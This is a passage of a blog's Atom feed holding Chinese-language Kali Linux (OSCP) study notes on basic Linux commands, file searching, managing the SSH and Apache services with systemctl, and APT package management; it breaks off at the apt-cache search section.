<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.1.1">Jekyll</generator><link href="https://blog.securitainment.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://blog.securitainment.io/" rel="alternate" type="text/html" /><updated>2020-10-08T23:35:26+08:00</updated><id>https://blog.securitainment.io/feed.xml</id><title type="html">Securitainment.io</title><subtitle>learn | code | hack</subtitle><entry><title type="html">Kali Linux 渗透测试(OSCP)笔记 0x01</title><link href="https://blog.securitainment.io/pentest/kali/linux/2020/10/08/pentesting-with-kali-0x01.html" rel="alternate" type="text/html" title="Kali Linux 渗透测试(OSCP)笔记 0x01" /><published>2020-10-08T17:02:46+08:00</published><updated>2020-10-08T17:02:46+08:00</updated><id>https://blog.securitainment.io/pentest/kali/linux/2020/10/08/pentesting-with-kali-0x01</id><content type="html" xml:base="https://blog.securitainment.io/pentest/kali/linux/2020/10/08/pentesting-with-kali-0x01.html">&lt;h2 id=&quot;认识-kali&quot;&gt;认识 Kali&lt;/h2&gt;
&lt;h3 id=&quot;linux-文件系统&quot;&gt;Linux 文件系统&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin&lt;/code&gt; - 基础命令（&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cd&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat&lt;/code&gt;, etc）&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/sbin&lt;/code&gt; - 系统应用（&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fdisk&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mkfs&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sysctl&lt;/code&gt;, etc）&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc&lt;/code&gt; - 配置文件&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/tmp&lt;/code&gt; - 临时文件（在引导&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;boot&lt;/code&gt;时被删除）&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/bin&lt;/code&gt; - 一般应用（&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;apt&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ncat&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt;, etc）&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share&lt;/code&gt; - 存放应用共享文件和数据的目录&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;基础-linux-命令&quot;&gt;基础 Linux 命令&lt;/h3&gt;
&lt;h4 id=&quot;man-命令&quot;&gt;man 命令&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;man&lt;/code&gt; 显示命令的使用手册（manual pages），比如查看&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt;命令的使用手册：&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;man &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;在使用手册页面，命令右边会有一个角标，表示应用的级别，命令的级别分别为：&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;级别&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;内容&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;1&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;用户命令&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;2&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;系统内核调用的程序接口&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;C语言库调用的程序接口&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;4&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;特殊文件比如设备节点和驱动&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;5&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;档案格式&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;6&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;游戏&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;7&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;杂项&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;8&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;管理员命令&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;假如我们想要查看&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;etc/passwd&lt;/code&gt;文件的帮助，使用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;man passwd&lt;/code&gt;显然不是我们想要的，这时使用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-k&lt;/code&gt;参数来搜索&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;passwd&lt;/code&gt;关键词相关的内容：&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;man &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; passwd
checkPasswdAccess &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - query the SELinux policy database &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;the kernel
chgpasswd &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;8&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;        - update group passwords &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;batch mode
chpasswd &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;8&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;         - update passwords &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;batch mode
passwd &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;5&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;           - the password file
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;还可以使用正则来匹配&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;passwd&lt;/code&gt;单词：&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;man &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'^passwd$'&lt;/span&gt;
passwd &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;           - change user password
passwd &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1ssl&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;        - compute password hashes
passwd &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;5&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;           - the password file
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;这时就可以使用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;man 5 passwd&lt;/code&gt;来查看&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;passwd&lt;/code&gt;文件的帮助：&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;man 5 passwd
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;apropos&quot;&gt;apropos&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;apropos&lt;/code&gt; 命令和 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;man -k&lt;/code&gt; 命令是一样的&lt;/p&gt;

&lt;h4 id=&quot;列出文件&quot;&gt;列出文件&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; 命令输出基本的文件列表，可以通过多个参数丰富输出的内容，比如使用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-a&lt;/code&gt;参数输出所有文件（包括隐藏文件），使用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-l&lt;/code&gt;参数输出文件更多信息：&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
&lt;/span&gt;Desktop  Documents  Downloads  Music  PentestEnv  Pictures  Public  Templates  Videos
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; /etc/apache2/sites-available/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.conf
/etc/apache2/sites-available/000-default.conf
/etc/apache2/sites-available/default-ssl.conf
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-al&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
..
.bash_history
.bashrc
.cache
.config
Desktop
Documents
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;定位到不同目录&quot;&gt;定位到不同目录&lt;/h4&gt;
&lt;p&gt;Linux 不使用 Windows 风格的盘符，所有文件、文件夹、设备等，全部在根目录&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/&lt;/code&gt;下的子目录中。使用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cd&lt;/code&gt;命令来更改当前所在目录，使用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pwd&lt;/code&gt;命令输出当前所在目录，使用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cd ~&lt;/code&gt;命令回到用户根目录：&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /usr/share/metasploit-framework/
/usr/share/metasploit-framework&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;pwd&lt;/span&gt;
/usr/share/metasploit-framework
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; ~
/home/kali
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;新建目录&quot;&gt;新建目录&lt;/h4&gt;
&lt;p&gt;使用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mkdir&lt;/code&gt;+目录名来新建目录：&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mkdir &lt;/span&gt;notes
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;notes/
~/notes&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mkdir &lt;/span&gt;module one
~/notes&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
&lt;/span&gt;module  one
~/notes&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-rf&lt;/span&gt; module/ one/
~/notes&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;module one&quot;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;module&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;one/
~/notes/module one&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;使用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mkdir -p&lt;/code&gt;命令一次创建多个目录：&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;test&lt;/span&gt;/&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;recon,exploit,report&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;test&lt;/span&gt;/
exploit
recon
report
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;查找文件&quot;&gt;查找文件&lt;/h2&gt;
&lt;p&gt;在 Kali Linux 中查找文件或文件夹的三个常用命令为：&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;find, locate, which&lt;/code&gt;。&lt;/p&gt;

&lt;h3 id=&quot;which&quot;&gt;which&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;https://linux.die.net/man/1/which&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;which&lt;/code&gt;&lt;/a&gt; 命令在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$PATH&lt;/code&gt; 定义的环境中查找文件，返回完整路径：&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$PATH&lt;/span&gt;
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;which sbd
/usr/bin/sbd
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;locate&quot;&gt;locate&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;https://linux.die.net/man/1/locate&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;locate&lt;/code&gt;&lt;/a&gt;命令查找文件或文件夹最快，实际上是通过搜索内置的数据库 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;locate.db&lt;/code&gt; 查找的，这个数据库自动更新，也可以使用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;updatedb&lt;/code&gt; 命令手动更新。&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;updatedb

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;locate sbd.exe
/usr/share/windows-resources/sbd/sbd.exe
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;find&quot;&gt;find&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;https://linux.die.net/man/1/find&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;find&lt;/code&gt;&lt;/a&gt; 命令是这三个里最复杂和灵活的搜索工具。如在根目录中搜索开头是 “sbd” 的文件：&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;find / &lt;span class=&quot;nt&quot;&gt;-name&lt;/span&gt; sbd&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
/usr/bin/sbd
/usr/share/doc/sbd
/usr/share/windows-resources/sbd
/usr/share/windows-resources/sbd/sbd.exe
/usr/share/windows-resources/sbd/sbdbg.exe
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;find&lt;/code&gt; 不仅可以搜索文件和目录名，还可以搜索文件时间、大小、所属、文件类型、权限等…&lt;/p&gt;

&lt;h2 id=&quot;管理-kali-linux-服务&quot;&gt;管理 Kali Linux 服务&lt;/h2&gt;
&lt;h3 id=&quot;ssh-服务&quot;&gt;SSH 服务&lt;/h3&gt;
&lt;p&gt;SSH 服务基于 TCP，默认监听 22 端口。开启 SSH 服务的命令为：&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;systemctl start ssh

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;该命令不输出结果，但是可以通过查找监听 TCP 22 端口的服务来确认已经启动：&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;ss &lt;span class=&quot;nt&quot;&gt;-antlp&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;sshd
LISTEN     0      128          &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;:22                       &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;                   &lt;span class=&quot;nb&quot;&gt;users&lt;/span&gt;:&lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;sshd&quot;&lt;/span&gt;,pid&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;472,fd&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;3&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
LISTEN     0      128         :::22                      :::&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;                   &lt;span class=&quot;nb&quot;&gt;users&lt;/span&gt;:&lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;sshd&quot;&lt;/span&gt;,pid&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;472,fd&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;如果希望 SSH 服务在 Kali 开启时自动启动，使用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;systemctl&lt;/code&gt; 命令，该命令可以启用或 禁用大部分服务。&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;systemctl &lt;span class=&quot;nb&quot;&gt;enable &lt;/span&gt;ssh
Synchronizing state of ssh.service with SysV service script with /lib/systemd/systemd-
Executing: /lib/systemd/systemd-sysv-install &lt;span class=&quot;nb&quot;&gt;enable &lt;/span&gt;ssh
Created symlink /etc/systemd/system/sshd.service → /lib/systemd/system/ssh.service.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;http-服务&quot;&gt;HTTP 服务&lt;/h3&gt;
&lt;p&gt;HTTP 服务基于 TCP 协议，默认监听 80  端口。启动 HTTP 服务和启用 SSH 服务相似：&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;systemctl start apache2

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;同样的方法确认 HTTP 服务已经启动：&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;ss &lt;span class=&quot;nt&quot;&gt;-antlp&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;apache
LISTEN     0      128         :::80                      :::&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;                   &lt;span class=&quot;nb&quot;&gt;users&lt;/span&gt;:&lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;apache2&quot;&lt;/span&gt;,pid&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2434,fd&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;apache2&quot;&lt;/span&gt;,pid&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2433,fd&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;apache2&quot;&lt;/span&gt;,pid&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2431,fd&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;让 HTTP 服务开机时启动的方法和设置 SSH 服务的方法一样，使用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;systemctl&lt;/code&gt;。&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;systemctl &lt;span class=&quot;nb&quot;&gt;enable &lt;/span&gt;apache2
Synchronizing state of apache2.service with SysV service script with /lib/systemd/syst
Executing: /lib/systemd/systemd-sysv-install &lt;span class=&quot;nb&quot;&gt;enable &lt;/span&gt;apache2
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;在 Kali 中大多数服务的操作和操作 SSH 以及 HTTP 服务一样，查看所有可用的服务，运行 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;systemctl list-unit-files&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;systemctl list-unit-files
...
UNIT FILE   STATE
proc-sys-fs-binfmt_misc.automount   static
-.mount generated
dev-hugepages.mount static
dev-mqueue.mount    static
media-cdrom0.mount  generated
proc-sys-fs-binfmt_misc.mount   static
run-vmblock&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;2dfuse.mount   disabled
sys-fs-fuse-connections.mount   static
sys-kernel-config.mount static
sys-kernel-debug.mount  static
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;搜索安装移除工具&quot;&gt;搜索、安装、移除工具&lt;/h2&gt;
&lt;p&gt;APT 是 Debian-based 系统中管理包和应用的工具，可以安装、移除应用，升级包，甚至升级整个系统。&lt;/p&gt;

&lt;h3 id=&quot;apt-update&quot;&gt;apt update&lt;/h3&gt;
&lt;p&gt;为了加快查找 APT 数据库相关操作的速度，APT 包是缓存在本地的。一个好的习惯是升级可用包和相关信息，包括版本等信息列表。使用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;apt update&lt;/code&gt;：&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;apt update
Hit:1 http://kali.mirror.globo.tech/kali kali-rolling InRelease
Reading package lists... Done
Building dependency tree
Reading state information... Done
699 packages can be upgraded.
Run &lt;span class=&quot;s1&quot;&gt;'apt list --upgradable'&lt;/span&gt; to see them.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;apt-upgrade&quot;&gt;apt upgrade&lt;/h3&gt;
&lt;p&gt;升级完 APT 数据库，就可以升级以安装的包或者系统。比如升级 metasploit-framework：&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;apt upgrade metasploit-framework

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;apt-cache-search-和-apt-show&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;apt-cache search&lt;/code&gt; 和 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;apt show&lt;/code&gt;&lt;/h3&gt;
&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;apt-cache search&lt;/code&gt; 命令查找内置缓存数据库并提供相关信息。比如要安装 &lt;em&gt;pure-ftpd&lt;/em&gt;，第一件事就是查找该工具是否包含在 Kali 源里面：&lt;/p&gt;
